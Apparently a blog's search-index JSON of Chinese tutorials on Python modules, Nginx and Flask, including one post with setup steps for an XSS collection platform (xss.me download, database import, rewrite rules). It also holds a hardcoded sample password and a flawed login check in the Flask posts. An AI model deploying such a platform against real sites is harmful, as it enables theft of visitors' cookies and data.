os.path.commonpath([&apos;/usr/lib&apos;, &apos;/usr/local/lib&apos;])&apos;/usr&apos; os.path.dirname(path) 返回路径字符串中的关于文件夹的路径 12345&gt;&gt;&gt; os.path.dirname(&apos;/usr/local/src/&apos;)&apos;/usr/local/src&apos;&gt;&gt;&gt; os.path.dirname(&apos;/usr/local/src/test.txt&apos;)&apos;/usr/local/src&apos; os.path.exists(path) 判断文件路径是否真实存在 123456&gt;&gt;&gt; os.path.exists(&apos;/usr/local/src&apos;)False&gt;&gt;&gt; os.path.exists(&apos;/usr/local&apos;)True&gt;&gt;&gt; os.path.exists(&apos;/usr/local/sbin&apos;)True os.path.expanduser(path) 把path中包含的&quot;&quot;和&quot;user&quot;转换成用户目录 12&gt;&gt;&gt; os.path.expanduser(&apos;~&apos;)&apos;/Users/xxx&apos; os.path.expandvars(path) 根据环境变量，替换路径存在的$name 和 ${name} 的值 12&gt;&gt;&gt; os.path.expandvars(&apos;$PYENV_ROOT&apos;)&apos;/Users/xxx/.pyenv&apos; os.path.getatime(path) os.path.getmtime(path) os.path.getctime(path) 1234567891011121314文件的 Access time，atime 是在读取文件或者执行文件时更改的任何对inode的访问都会使此处改变。文件的Modified time，mtime 是在写入文件时随文件内容的更改而更改的。文件的 Change time，ctime 是在写入文件、更改所有者、权限或链接设置时随 Inode 的内容更改而更改的。只要stat出来的内容发生改变就会发生改变。mtime的改变必然导致ctime的改变。文件夹的 Access time，atime 是在读取文件或者执行文件时更改的（我们只cd进入一个目录然后cd ..不会引起atime的改变，但ls一下就不同了）。文件夹的 Modified time，mtime 是在文件夹中有文件的新建、删除才会改变文件夹的 Change time，ctime 基本同文件的ctime，其体现的是inode的change time。&gt;&gt;&gt; os.path.getatime(&apos;/Users/xxxx/demo.py&apos;)1524670536.2193816 os.path.getsize(path) 得到文件的大小。 以bytes为单位。如果不存在或者路径错误，返回OSError 12345[21:31:34] xxx ➜ ~» ls -hl demo.py -rw-r--r-- 1 xxxx staff 21B Apr 25 23:35 demo.py&gt;&gt;&gt; os.path.getsize(&apos;/Users/wenzhongwei/demo.py&apos;)21 os.path.isabs(path) 如果是绝对路径，返回True 12&gt;&gt;&gt; os.path.isabs(&apos;/user&apos;)True os.path.isfile(path) os.path.isdir(path) os.path.islink(path) os.path.ismount(path) 顾名思义，判断语句.会先判断这个路径字符是否真实存在，如果不存在，返回False 1234&gt;&gt;&gt; os.path.isfile(&apos;/user/text.txt&apos;)False&gt;&gt;&gt; os.path.isfile(&apos;/Users/xxx/demo.py&apos;)True os.path.join(path) 将字符拼接成合适的字符路径 12345678910&gt;&gt;&gt; os.path.join(&apos;usr&apos;,&apos;src&apos;)&apos;usr/src&apos;&gt;&gt;&gt; os.path.join(&apos;/usr&apos;,&apos;src&apos;)&apos;/usr/src&apos;&gt;&gt;&gt; os.path.join(&apos;C:&apos;,&apos;src&apos;)&apos;C:/src&apos;&gt;&gt;&gt; os.path.join(&apos;c:&apos;,&apos;src&apos;)&apos;c:/src&apos;&gt;&gt;&gt; os.path.join(&apos;test&apos;,&apos;.src&apos;)&apos;test/.src&apos; os.path.normcase(path) os.path.normpath(path) 格式化字符路径，使之符合当前系统格式 12&gt;&gt;&gt; os.path.normcase(&apos;/User/local&apos;)&apos;/User/local&apos; os.path.realpath(path) 返回字符路径的真实路径 12&gt;&gt;&gt; os.path.realpath(&apos;.&apos;)&apos;/Users/xxx&apos; os.path.relpath(path) 返回相对路径 12&gt;&gt;&gt; os.path.relpath(&apos;/Users/xxx&apos;)&apos;.&apos; os.path.samefile(path1,path2) 如果两个文件名都是指向同一个文件的话，返回True，this is determined by the device number and i-node number os.path.sameopenfile(fp1,fp2) os.path.split(path) 切割成 路径 ， 文件名 12&gt;&gt;&gt; os.path.split(&apos;/usr/local/test.txt&apos;)(&apos;/usr/local&apos;, &apos;test.txt&apos;) os.path.splitext(path) 切割成路径 ， 后缀名 12&gt;&gt;&gt; os.path.splitext(&apos;/usr/local/test.txt&apos;)(&apos;/usr/local/test&apos;, &apos;.txt&apos;) os.path.supports_unicode_filename","categories":[{"name":"python","slug":"python","permalink":"http://yoursite.com/categories/python/"},{"name":"modules","slug":"python/modules","permalink":"http://yoursite.com/categories/python/modules/"}],"tags":[{"name":"Python","slug":"Python","permalink":"http://yoursite.com/tags/Python/"}]},{"title":"XSS平台的搭建","slug":"XSS平台的搭建","date":"2018-06-14T12:20:09.000Z","updated":"2018-06-14T15:27:07.816Z","comments":true,"path":"2018/06/14/XSS平台的搭建/","link":"","permalink":"http://yoursite.com/2018/06/14/XSS平台的搭建/","excerpt":"","text":"lnmp环境搭建 下载 123456https://lnmp.org/download.htmltar -zxvf lnmp1.5-full.tar.gz./install.sh lnmp或者./install.sh lamp XSS平台 1234567891011121314151. 下载xss平台https://git.oschina.net/nMask/Resource/raw/master/xss.me.new.zip2. 数据库配置打开phpmyadmin，新建数据库 poppy将解压出来的xss.sql移动到 phpmyadmin/upload 目录下面在phpmyadmin选择导入，执行。成功导入数据库3.config.php$config[&apos;register&apos;] = &apos;normal&apos; //invite需要邀请码$config[&apos;dBPwd&apos;]=&apos;xxx&apos;$config[&apos;urlroot&apos;] = 192.168.31.xx xss_url 为404 nginx 的解决方式 通过转换.htaccess: http://www.anilcetin.com/convert-apache-htaccess-to-nginx/ 将转换后的内容写入/usr/local/nginx/config/my.conf 123456location / &#123; rewrite &quot;^/([0-9a-zA-Z]&#123;6&#125;)$&quot; /index.php?do=code&amp;urlKey=$1 last; rewrite ^/do/auth/(w+?)(/domain/([w.]+?))?$ /; rewrite ^/register/(.*?)$ /index.php?do=register&amp;key=$1 last; rewrite ^/register-validate/(.*?)$ /index.php?do=register&amp;act=validate&amp;key=$1 last;&#125; apache的解决方式,新增 .htaccess 12345678&lt;IfModule mod_rewrite.c&gt;RewriteEngine OnRewriteBase /RewriteRule ^([0-9a-zA-Z]&#123;6&#125;)$ /index.php?do=code&amp;urlKey=$1 [L] RewriteRule ^do/auth/(w+?)(/domain/([w.]+?))?$ /index.php?do=do&amp;auth=$1&amp;domain=$3 [L] RewriteRule ^register/(.*?)$ /index.php?do=register&amp;key=$1 [L] RewriteRule ^register-validate/(.*?)$ /index.php?do=register&amp;act=validate&amp;key=$1 [L]&lt;/IfModule&gt; 然后修改apache的配置 1AllowOverride None ==&gt; AllowOverride All Reference https://thief.one/2017/03/15/Xss平台搭建小记/ https://zhuanlan.zhihu.com/p/27020543","categories":[{"name":"security","slug":"security","permalink":"http://yoursite.com/categories/security/"},{"name":"xss","slug":"security/xss","permalink":"http://yoursite.com/categories/security/xss/"}],"tags":[{"name":"security","slug":"security","permalink":"http://yoursite.com/tags/security/"},{"name":"Linux","slug":"Linux","permalink":"http://yoursite.com/tags/Linux/"},{"name":"xss","slug":"xss","permalink":"http://yoursite.com/tags/xss/"}]},{"title":"python模块-subprocess","slug":"python模块-subprocess","date":"2018-06-13T00:31:54.000Z","updated":"2018-06-18T16:19:30.072Z","comments":true,"path":"2018/06/13/python模块-subprocess/","link":"","permalink":"http://yoursite.com/2018/06/13/python模块-subprocess/","excerpt":"","text":"概述 subprocess 允许你启动一个新的进程，连接到这个进程的输入，输出，错误的管道中，取得返回的值。用于执行一些系统的命令 代码结构及其实例 run 官方推荐其使用 run 方法。这是一个封装好的subprocess方法, 返回一个CompleteProcess 实例 1subprocess.run(args, *, stdin=None, input=None, stdout=None, stderr=None, shell=False, cwd=None, timeout=None, check=False, encoding=None, errors=None) 代码1： 12345import subprocess# 运行后不会有输出a = subprocess.run(&apos;ls -al&apos;,shell=True,stdout=subprocess.PIPE)# 输出a.stdout 代码2： 12345678import subprocessb = subprocess.run([&apos;ls&apos;,&apos;-al&apos;],stdout=subprocess.PIPE)b.stdoutCompleteProcess对象有以下参数：args: 用于执行的命令，比如 ls -al, [&apos;ls&apos;,&apos;-al&apos;]returnCode: 退出进程后，返回值stdout: 命令输出stderr: 命令错误时输出 subprocess构造函数 1class subprocess.Popen(args, bufsize=-1, executable=None, stdin=None, stdout=None, stderr=None, preexec_fn=None, close_fds=True, shell=False, cwd=None, env=None, universal_newlines=False, startupinfo=None, creationflags=0, restore_signals=True, start_new_session=False, pass_fds=(), *, encoding=None, errors=None) 常见代码1： 12345test = subprocess.Popen([&apos;ls&apos;,&apos;-al&apos;],stdout=subprocess.PIPE)# test.stdout 返回一个&lt;_io.BufferedReader name=3&gt;test.stdiyt.read() # 读取输出注： 必须要有 stdout=subprocess.PIPE 否则不会有输出。 与命令交互： 1Popen.communicate(input=None,timeout=None) # (stdout_data,stderr_data)","categories":[{"name":"python","slug":"python","permalink":"http://yoursite.com/categories/python/"},{"name":"modules","slug":"python/modules","permalink":"http://yoursite.com/categories/python/modules/"}],"tags":[{"name":"Python","slug":"Python","permalink":"http://yoursite.com/tags/Python/"}]},{"title":"python模块 - re","slug":"python模块-re","date":"2018-06-13T00:30:57.000Z","updated":"2018-06-18T16:19:08.558Z","comments":true,"path":"2018/06/13/python模块-re/","link":"","permalink":"http://yoursite.com/2018/06/13/python模块-re/","excerpt":"","text":"概述 正则表达式是处理字符串的强大的工具，检索字符串，替换，匹配验证等等。 常用的匹配规则 123456789\\w 匹配字母，数字和下划线\\d 匹配数字\\s 匹配任何空白字符\\z 匹配字符串结尾，如果有换行符，一起匹配\\n 匹配换行\\t 匹配制表符^ 匹配开头$ 匹配结尾. 匹配任何字符，除了换行符，除非指定re.DOTALL python的re模块 注： .*? 遇到换行符就不管用了，除非加上re.S match match 尝试从字符串开头开始匹配正则表达式，如果成功就返回，如果没有就返回一二None 12345678910111213&gt;&gt;&gt; import re&gt;&gt;&gt; a = &quot;Hello World&quot;&gt;&gt;&gt; b = re.match(&apos;\\w+\\s&apos;,a,re.S)&gt;&gt;&gt; b&lt;_sre.SRE_Match object; span=(0, 6), match=&apos;Hello &apos;&gt;&gt;&gt;&gt; b.span()(0, 6)&gt;&gt;&gt; b.group()&apos;Hello &apos;&gt;&gt;&gt; b.group(0)&apos;Hello &apos;None 是false search 扫描整个字符串，如果符合就返回，否则返回none 1234567&gt;&gt;&gt; import re&gt;&gt;&gt; a = &quot;Hello World&quot;&gt;&gt;&gt; c = re.search(&apos;\\s\\w+&apos;,a)&gt;&gt;&gt; c&lt;_sre.SRE_Match object; span=(5, 11), match=&apos; World&apos;&gt;&gt;&gt;&gt; c.group()&apos; World&apos; findall 当需要提取全部匹配的内容，需要使用findall，使用search只能取回第一个。如果在匹配的时候用括号指定了，那么返回中的列表就会包含元祖 123&gt;&gt;&gt; d = re.findall(r&apos;He(l)l(o)&apos;,a)&gt;&gt;&gt; d[(&apos;l&apos;, &apos;o&apos;)] sub 替换文本,返回替换好的字符串 1re.sub(&apos;\\s\\w+&apos;,&apos;johnw&apos;,a)","categories":[{"name":"python","slug":"python","permalink":"http://yoursite.com/categories/python/"},{"name":"modules","slug":"python/modules","permalink":"http://yoursite.com/categories/python/modules/"}],"tags":[{"name":"Python","slug":"Python","permalink":"http://yoursite.com/tags/Python/"}]},{"title":"Linux - Nginx","slug":"Linux-Nginx","date":"2018-06-09T13:22:07.000Z","updated":"2018-06-14T15:27:09.267Z","comments":true,"path":"2018/06/09/Linux-Nginx/","link":"","permalink":"http://yoursite.com/2018/06/09/Linux-Nginx/","excerpt":"","text":"nginx做为静态服务器和反向代理服务器 安装nginx 1234567891011121314151617181920212223# 查看nginx版本,内核需要2.6以上uname -a#安装gccyum install gcc gcc-c++ pcre-devel zlib zlib-devel openssl openssl-develgcc 编译cgcc-c++ 编译c++pcre-devel 解析perl正则zlib 用于压缩zlib-devel 用于开发openssl 用于ssl加密#安装nginx./configuremakemake install#configure配置选项--prefix=PATH 安装部署后的根目录--sbin-path 可执行文件的放置路径 基于前面的prefix &lt;prefix&gt;/sbin/nginx--conf-path 放置配置文件 &lt;prefix&gt;/conf/nginx.conf--error-log-path &lt;prefix&gt;/logs/errors.log 启动nginx 12./usr/local/sbin/nginx -s stop / reload -c xxx.conf 将nginx做为静态服务器 case: 123456server &#123; location ^~ /static&#123; alias usr/local/nginx/conf &#125;&#125; 明确root和alias的不同 1234567891011121314151617# rootlocation conf &#123; root usr/local/nginx;&#125;# aliaslocation conf &#123; alias usr/local/nginx/conf;&#125;alias 要指定到具体的一层文件夹root 会根据url来映射文件夹比如：http://www.xxx.com/conf/test.html alias的处理 匹配location为conf的规则，将配置的文件夹直接返回给用户root的处理：匹配到location为conf的规则，提取/conf/test.html 拼接到已配置的文件夹下面 将nginx做为反向代理服务器 12345678910111213# 在nginx.conf里面的http模块里面加入include &apos;/usr/local/nginx/conf/nginx2.conf&apos;vim nginx2.confupstream xxx&#123; server 112.11.11.11:8080;&#125;server&#123; server_name www.xxx.com; location / &#123; proxy_pass http://xxx; &#125;&#125; 如何做好负载均衡？ 12345upstream xxx&#123; server 111.111.111.111 weight=5(权重，优先转发); server 222.222.222.222 max_fails=3 fail_timeout=30s(失败3次，30s); server 333.333.333.333 down(下线);&#125;","categories":[{"name":"Linux","slug":"Linux","permalink":"http://yoursite.com/categories/Linux/"},{"name":"Nginx","slug":"Linux/Nginx","permalink":"http://yoursite.com/categories/Linux/Nginx/"}],"tags":[]},{"title":"Flask06 - User Profile","slug":"Flask06-User-Profile","date":"2018-06-09T13:21:27.000Z","updated":"2018-06-18T16:19:58.837Z","comments":true,"path":"2018/06/09/Flask06-User-Profile/","link":"","permalink":"http://yoursite.com/2018/06/09/Flask06-User-Profile/","excerpt":"","text":"概述 如何用flask实现用户个人中心和头像 个人中心 使用名字做为url的一部分来分辨个人中心。注意点（url_for, first_or_404） 12345678910111213141516@app.route(&apos;/user/&lt;username&gt;&apos;)def user(): user = User.query.filter_by(username=username).first_or_404() posts = [ &#123;&apos;author&apos;:user,&apos;body&apos;:&apos;Test Post #1&apos;&#125;, &#123;&apos;author&apos;:user,&apos;body&apos;:&apos;Test Post #2&apos;&#125;, ] return render_template(&apos;user.html&apos;,user=user,posts=posts) #使用&lt;username&gt;做为url的变量来区别用户。还有其他几种方式&lt;string:username&gt;&lt;int:user_id&gt;&lt;any(a,b):page_name&gt; 不是 a 就是 b* 注意： 当使用url_for 引用这个地址的时候，要把参数加进去url_for(&apos;user&apos;,username=username) 如何生成头像，并展示和应用于每个用户 通过请求 https://www.gravatar.com/avatar/ 就可以请求到一张图片，其中这个hash可以是email或者任意值 12345678class User(UserMixin,db.Model): ... def set_avatars(self,size): url = &quot;https://www.gravatar.com/avatar/&#123;&#125;?d=identicon&amp;s=&#123;&#125;&quot;.format(md5(self.username.lower().encode(&apos;utf-8&apos;)).hexdigest(),size) return url # 在HTML模板里面展示&lt;img src=&apos;&#123;&#123; current_user.set_avatars(128)&#125;&#125;&apos;&gt; 对于重复的部分，使用jinja2的子模板 123456# 对于发表文章这一部分，可能其他的地方也会用到，比如首页。因此我们将这部分独立出来_posts.html# 使用include，可以实现把子模板包含进来&#123;% include &quot;_posts.html&quot; %&#125; 增加两个值，一个最后登录的时间，一个是个性签名 12345678910111213141516class User(UserMixin,db.Model): ... # 增加两个字段 last_seen = db.Column(db.DateTime,default=datetime.now) about_me = db.Column(db.String(140))# 如何使用last_seen这个参数？我们每次用户发送请求过来的时候，我们都去更新这个值# 在每个请求之前，需要执行的操作。# 为什么不用db.session.add ， 是因为 current_user 是flask-login从db里面query出来的。本来就已经在db.session里面了。 @app.before_requestdef before_request(): if current_user.is_authenticated: current_user.last_seen = datetime.now() db.session.commit() edit user profile 1234567891011121314@app.route(&apos;/edit_profile&apos;,methods=[&apos;GET&apos;,&apos;POST&apos;])@login_requireddef edit_profile(): form = EditProfileForm() if form.validate_on_submit(): current_user.username = form.username.data current_user.about_me = form.about_me.data db.session.commit() flash(&apos;Your change have saved.&apos;) return redirect(url_for(&apos;user&apos;,username=current_user.username)) form.username.data = current_user.username form.about_me.data = current_user.about_me return render_template(&apos;profile.html&apos;,form=form) 总结 主要遇到的问题，就是flask-migrate 的时候，如果你已经downgrade一次了，一定要把version下面的版本文件给删除，否则会出现版本不是最新的状况。","categories":[{"name":"python","slug":"python","permalink":"http://yoursite.com/categories/python/"},{"name":"flask","slug":"python/flask","permalink":"http://yoursite.com/categories/python/flask/"}],"tags":[{"name":"Flask","slug":"Flask","permalink":"http://yoursite.com/tags/Flask/"}]},{"title":"Flask05 - User login","slug":"Flask05-User-login","date":"2018-06-09T13:20:49.000Z","updated":"2018-06-18T16:20:02.411Z","comments":true,"path":"2018/06/09/Flask05-User-login/","link":"","permalink":"http://yoursite.com/2018/06/09/Flask05-User-login/","excerpt":"","text":"概述 使用flask 实现登录的功能 用户登录 用户密码安全 123456789101112131415161718192021# 用户密码的安全我们使用werkzeug.sercurity来做,增加两个函数class User(db.Model): ... def set_password_hash(self,password): return self.password_hash = generate_password_hash(password) def check_password_hash(self,password): return check_password_hash(self.password_hash,password) # 用户的密码安全存储a. 用户密码原始值 + 随机字符b. hash256c. hash值 + 随机字符d. 存入数据库# 校验用户密码安全a. 取出hash值,截取随机字符b. 接受用户输入的密码 + 截取的随机字符c. 使用相同的hash函数进行hashd. 将得到的hash值与数据库的hash值进行比较 安装flask-login 1pip install flask-login flask-login 介绍 1234567891011121314151617181920212223242526272829303132# flask-login 是flask的插件，用于登录用户，管理用户session，登出用户等等。# 一共有四种属性is_authenticated： 如果用户已经认证了is_active： 如果用户是已经激活的状态，也可以认为是认证了is_anonymous： 未登录的状态get_id()：将用户id做为一个字符返回# 使用步骤a. 在app/__init__.py 中初始化flask-login 并且指定哪个view 函数来做为登录处理函数##### 引入登录管理函数login_manager = LoginManager(app)login_manager.session_protection = &quot;strong&quot;##### 如果登录函数是在蓝图中的话，可以使用例如 main.login 这样的方式login_manager.login_view = &apos;login&apos;b. 在 models.py 里面指定哪个为用户的数据库表对象，然后通过user_id 来管理和追踪用户的sessionfrom flask_login import UserMixinclass User(UserMixin,db.Model): ...c. 通过user id来管理会话@login_manager.user_loaderdef load_user(id): #### 经过flask-login处理 id 已经是字符了，所以要加int，类型转换 return User.query.get(int(id))d. 通过login_user 来登录用户e. 通过logout_user 来注销用户f. 通过 @login_required 包装函数来保护登录的链接 用户登录逻辑 1234567891011121314151617181920# 结合上面陈述，代码如下@app.route(&apos;/login&apos;,methods=[&apos;GET&apos;,&quot;POST&quot;])def login(): if current_user.is_authenticated: return redirect(url_for(&apos;index&apos;)) form = LoginForm() # 处理表单验证的逻辑 if form.validate_on_submit(): # 存储提示信息，可以使用get_flashed_messages 来获取 # flash(&apos;Login Request from user: &#123;&#125; and remember me: &#123;&#125;&apos;.format(form.username.data,form.remember_me.data)) user = User.query.filter_by(username=form.username.data).first() if user is None and user.check_password(form.password.data): flash(&quot;Your password or username was wrong.&quot;) return redirect(url_for(&apos;login&apos;)) login_user(user,form.remember_me.data) return redirect(url_for(&apos;index&apos;)) return render_template(&apos;login.html&apos;,form=form,title=&apos;login&apos;) 如何显示登录错误的信息 1234567891011可以再script里面显示&lt;script&gt; &#123;% with messages = get_flashed_messages() %&#125; &#123;% if messages %&#125; &#123;% for message in messages %&#125; alert(&quot;&#123;&#123; message &#125;&#125;&quot;) &#123;% endfor %&#125; &#123;% endif %&#125; &#123;% endwith %&#125;&lt;/script&gt; 访问受保护的链接重定向网址 12345678910111213# 在flask中，如果你访问受保护的链接的时候，会重定向到登录的网址，后面加上?next_page=xxxx 从哪里来的例如：http://127.0.0.1:5000/login?next=%2Fprofile 返回默认的flash信息：&quot;please login to access this page&quot;# 不是很好，待改正next_page = request.args.get(&apos;next&apos;)if not next_page or url_parse(next_page).netloc != &apos;&apos;: next = url_for(index)return redirect(next_page) 注册 1234567891011@app.route(&apos;/register&apos;,methods=[&apos;GET&apos;,&apos;POST&apos;])def register(): form = RegisterForm() if form.validate_on_submit(): u = User(username=form.username.data,email=form.email.data) u.set_password_hash(form.password.data) db.session.add(u) db.session.commit() flash(&apos;Congratulations, You have registered the user! &apos;) return redirect(url_for(&apos;login&apos;)) return render_template(&apos;register.html&apos;,form=form) 注意的点 1234567891011121314151617class RegisterForm(FlaskForm): username = StringField(&apos;Username&apos;,validators=[DataRequired()]) password = PasswordField(&apos;Password&apos;,validators=[DataRequired()]) password2 = PasswordField(&apos;Re-enter Password&apos;,validators=[DataRequired(),EqualTo(&apos;password&apos;)]) email = StringField(&apos;Email&apos;,validators=[DataRequired(),Email()]) submit = SubmitField(&apos;Submit&apos;) # 在这里增加validate_&lt;field&gt; 函数，等到校验的时候，也会一并执行 def validate_username(self,username): user = User.query.filter_by(username=username.data).first() if user is not None: raise ValidationError(&apos;The user has exists.&apos;) def validate_email(self,email): user = User.query.filter_by(email=email.data).first() if user is not None: raise ValidationError(&apos;The email has exists&apos;)","categories":[{"name":"python","slug":"python","permalink":"http://yoursite.com/categories/python/"},{"name":"flask","slug":"python/flask","permalink":"http://yoursite.com/categories/python/flask/"}],"tags":[{"name":"Flask","slug":"Flask","permalink":"http://yoursite.com/tags/Flask/"}]},{"title":"Flask04 - Database","slug":"Flask04-Database","date":"2018-06-09T13:19:29.000Z","updated":"2018-06-18T16:20:07.858Z","comments":true,"path":"2018/06/09/Flask04-Database/","link":"","permalink":"http://yoursite.com/2018/06/09/Flask04-Database/","excerpt":"","text":"概述 简述flask中数据库的应用 flask中的数据库 安装数据库相关依赖 123pip install flask-sqlalchemypip install flask-migratepip install pymysql 数据库配置 1234567# 添加配置文件# configure.py# 数据库地址SQLALCHEMY_DATABASE_URI = os.environ.get(&apos;SQLALCHEMY_DATABASE_URI&apos;) or &quot;mysql+pymysql://root:qwe123@127.0.0.1/microblog&quot;# 是否记录application每次改变的信号。没什么用SQLALCHEMY_TRACK_MODIFICATIONS = False 在初始化app文件中引入 123# __init__.pydb = SQLAlchemy(app)migrate = Migrate(app,db) 设计并定义models 123456789101112131415161718192021222324252627from microblogapp import dbfrom datetime import datetimeclass User(db.Model): __tablename__ = &apos;user&apos; id = db.Column(db.Integer,primary_key=True) username = db.Column(db.String(64),unique=True,index=True) password_hash = db.Column(db.String(128)) email = db.Column(db.String(64),index=True,unique=True) # 存储一个字段，相当于执行了一次查询 posts = db.relationship(&apos;Post&apos;,backref=&apos;author&apos;,lazy=&apos;dynamic&apos;) def __repr__(self): return &quot;&lt;User : &#123;&#125;&gt;&quot;.format(self.username)class Post(db.Model): __tablename__ = &apos;post&apos; id = db.Column(db.Integer,primary_key=True) body = db.Column(db.String(140)) timestamp = db.Column(db.DateTime,index=True,default=datetime.now) # 外键，小写表名.id，通常采用蛇形写法： user_id user_id = db.Column(db.Integer,db.ForeignKey(&apos;user.id&apos;)) def __repr__(self): return &quot;&lt;Post:&#123;&#125;&gt;&quot;.format(self.body) 变更数据库结构，如何更好的迁移？ 12345678910111213141516171819使用flask_migrate来做迁移和记录。注意： 这里我们需要再run.py,也就是指定flask app的python文件里面，指定models，要不然migrate识别不到。# run.pyfrom microblogapp import models# commandflask db initflask db migrate -m &quot;init db&quot;flask db upgrade# 如何回滚？flask db downgrade # 如何回滚到之前的多个版本flask db downgrade f37d(版本号)* 版本号存在于 migrations/versions/ 下面 数据库中的关系 12345678910111213141516171819202122# 这里只暂时讲到了一对多的关系。# 一个人可以写多篇文章#在User里面posts = db.relationship(&apos;Post&apos;,backref=&apos;author&apos;,lazy=&apos;dynamic&apos;)实际上，posts不是数据库里面的一个字段，orm框架使用db.relationship这个函数，执行了查询语句,** 返回了关于这个User的Post对象，是一个列表u.posts =&gt; [Post1,Post2,Post3...]# 还可以进一步查询Post1.bodyPost1.timestamp# backref用于之处 &quot;多&quot; 的一端 指向 &quot;一&quot;的一端。p = Post.query.filter_by(xxx).first()p.author === &gt; 查出了User这个对象# 也就是说backref用于 『多』的一端 检索『一』的一端 数据库在flask中的查询语句 123456789101112131415161718# 查询Useru = User.query.filter_by(username=&apos;johnw&apos;).first()# 查询文章u.posts ==&gt; [Post1,Post2]# 查询文章内容for post in u.posts: print(post.body)# 添加用户u = User(username=&apos;johnw&apos;)# 添加文章p = Post(body=&quot;Hello world!&quot;)# 指定作者p.author = u# 按照username降序排列u = User.query.order_by(User.username.desc()).all() shell语句 1234# 为了更加方便我们在shell里面调试语句@app.shell_context_processordef make_shell_context(): return &#123;&quot;db&quot;:db,&quot;User&quot;:models.User,&quot;Post&quot;:models.Post&#125; 总结 12多的一端 存个id就好了一的一端 需要存个relationship","categories":[{"name":"python","slug":"python","permalink":"http://yoursite.com/categories/python/"},{"name":"flask","slug":"python/flask","permalink":"http://yoursite.com/categories/python/flask/"}],"tags":[{"name":"Flask","slug":"Flask","permalink":"http://yoursite.com/tags/Flask/"}]},{"title":"Flask03 - Web Form","slug":"Flask03-Web-Form","date":"2018-06-09T13:18:48.000Z","updated":"2018-06-18T16:20:11.413Z","comments":true,"path":"2018/06/09/Flask03-Web-Form/","link":"","permalink":"http://yoursite.com/2018/06/09/Flask03-Web-Form/","excerpt":"","text":"概述 简述了如何在flask中实现表单应用 Flask-WTF 安装 1pip install flask_wtf 配置文件 123456789101112# 配置文件应该单独出来# 表单需要用到secret key 做为CSRF的防护import os class Configure(object): SECRET_KEY = os.environ.get(&apos;SECRET_KEY&apos;) or &quot;You-never-guess&quot;#最后要在application初始化文件里面# 引入这个配置#__init__.pyapp.config.from_object(Configure) csrf 介绍： https://zh.wikipedia.org/zh/跨站请求伪造 配置文件的敏感数据 1将配置文件中的敏感数据做为系统变量，这样可以避免敏感数据的泄露，将开发和运维分离。 创建登录表单 123456789101112# 主要的功能导入from flask_wtf import FlaskForm# 引入字段from wtforms import StringField,PasswordField,SubmitField,BooleanField# 引入验证from wtforms.validators import DataRequiredclass LoginForm(FlaskForm): username = StringField(&apos;Username&apos;,validators=[DataRequired()]) password = PasswordField(&apos;Password&apos;,validators=[DataRequired()]) remember_me = BooleanField(&apos;Remember Me&apos;) submit = SubmitField(&apos;Submit&apos;) html中的表单 1234567891011121314151617181920&#123;&#123; form.hidden_tag() &#125;&#125;: 藏着crsf token&#123;&#123; form.username(class_=&apos;username&apos;) &#125;&#125;: 括号里面可以设置class name# 代码：&lt;form action=&apos;&apos; method=&apos;POST&apos;&gt; &#123;&#123; form.hidden_tag() &#125;&#125; &lt;p&gt; &#123;&#123; form.username.label() &#125;&#125; &#123;&#123; form.username(class_=&apos;username&apos;)&#125;&#125; &lt;/p&gt; &lt;p&gt; &#123;&#123; form.password.label() &#125;&#125; &#123;&#123; form.password(class_=&apos;password&apos;)&#125;&#125; &lt;/p&gt; &lt;p&gt; &#123;&#123; form.remember_me(class_=&apos;remember_me&apos;)&#125;&#125;&#123;&#123; form.remember_me.label() &#125;&#125; &lt;/p&gt; &lt;p&gt;&#123;&#123; form.submit() &#125;&#125;&lt;/p&gt;&lt;/form&gt; 处理表单的路由事件 123456789from microblogapp.forms import LoginForm@app.route(&apos;/login&apos;)def login(): form = LoginForm() if form.validate_on_submit(): flash(&apos;Login Request from user: &#123;&#125; and remember me: &#123;&#125;&apos;.format(form.username.data,form.remember_me.data)) return redirect(&apos;/index&apos;) return render_template(&apos;login.html&apos;,form=form,title=&apos;login&apos;) flash的内容 1234567891011&lt;!-- 使用with 声明一个变量来接受函数的返回值 --&gt;&#123;% with messages = get_flashed_messages() %&#125;&lt;!-- 返回了一个列表 --&gt; &#123;% if messages %&#125; &lt;ul&gt; &#123;% for message in messages %&#125; &lt;li&gt;&#123;&#123; message &#125;&#125;&lt;/li&gt; &#123;% endfor %&#125; &lt;/ul&gt; &#123;% endif %&#125; &#123;% endwith %&#125; 错误内容 123&#123;% for error in form.username.errors %&#125;&lt;span style=&apos;color:red;&apos;&gt;&#123;&#123; error&#125;&#125;&lt;/span&gt;&#123;% endfor %&#125;","categories":[{"name":"python","slug":"python","permalink":"http://yoursite.com/categories/python/"},{"name":"flask","slug":"python/flask","permalink":"http://yoursite.com/categories/python/flask/"}],"tags":[{"name":"Flask","slug":"Flask","permalink":"http://yoursite.com/tags/Flask/"}]},{"title":"Flask02 - Templates","slug":"Flask02-Templates","date":"2018-06-09T13:18:00.000Z","updated":"2018-06-18T16:20:19.192Z","comments":true,"path":"2018/06/09/Flask02-Templates/","link":"","permalink":"http://yoursite.com/2018/06/09/Flask02-Templates/","excerpt":"","text":"概述 这一章主要讲了一下flask中的模板的概念 什么是模板 创建模板文件夹 1mkdir microblogapp/templates render_template 函数 123456789101112131415161718192021222324@app.route(&apos;/&apos;)@app.route(&apos;/index&apos;)def index(): user = &#123; &quot;username&quot;:&quot;jacky&quot; &#125; posts = [ &#123; &quot;author&quot;:&#123; &quot;username&quot;:&quot;johnw&quot; &#125;, &quot;body&quot;:&quot;Hello World!!!&quot;, &#125;, &#123; &quot;author&quot;:&#123; &quot;username&quot;:&quot;Michael&quot;, &#125;, &quot;body&quot;:&quot;Beeeeeautiful Wrold. &quot; &#125; ] #顾名思义，就是渲染模板的函数。第一个参数是要渲染的html。 #在templates文件夹里面，接下来的一系列函数都可以在html里面用&#123;&#123;&#125;&#125;进行引用 return render_template(&apos;index.html&apos;,user=user,posts=posts) 条件语句 12345&#123;% if title %&#125; &lt;title&gt;&#123;&#123; title &#125;&#125; - microblog &lt;/title&gt;&#123;% else %&#125; &lt;title&gt;Hello - microblog &lt;/title&gt;&#123;% endif %&#125; 循环语句 123&#123;% for post in posts %&#125; &lt;div&gt;&lt;p&gt;&#123;&#123; post.author.username &#125;&#125; says: &#123;&#123; post.body &#125;&#125;&lt;/p&gt;&#123;% endfor %&#125; 模板继承 1234&#123;% extends &quot;basic.html&quot; %&#125;&#123;% block main %&#125; ...&#123;% endblock %&#125;","categories":[{"name":"python","slug":"python","permalink":"http://yoursite.com/categories/python/"},{"name":"flask","slug":"python/flask","permalink":"http://yoursite.com/categories/python/flask/"}],"tags":[{"name":"Flask","slug":"Flask","permalink":"http://yoursite.com/tags/Flask/"}]},{"title":"Flask01 - Hello 